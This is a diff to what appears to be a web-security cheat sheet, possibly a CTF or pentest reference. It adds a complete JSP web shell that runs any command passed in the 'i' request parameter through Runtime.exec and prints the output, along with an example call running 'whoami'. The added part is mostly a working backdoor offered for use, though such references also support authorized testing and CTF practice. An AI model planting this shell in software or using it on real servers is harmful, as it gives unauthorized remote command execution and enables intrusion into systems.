@@ -260,6 +260,26 @@ if("kaibro".equals(request.getParameter("pwd"))) {
 }
 %>
 ```
+```
+127.0.0.1/test.jsp?i=whoami
+
+<%@ page import="java.io.InputStream" %>
+<%@ page import="java.io.InputStreamReader" %>
+<%@ page import="java.io.BufferedReader" %>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%
+    Process p = Runtime.getRuntime().exec(request.getParameter("i"));
+    InputStream is = p.getInputStream();
+    BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+    response.getWriter().println("-----------");
+    String line;
+    while((line = reader.readLine())!=null){
+        response.getWriter().println(line);
+    }
+    
+%>
+```
+
 - Unicode webshell:
 
 ```
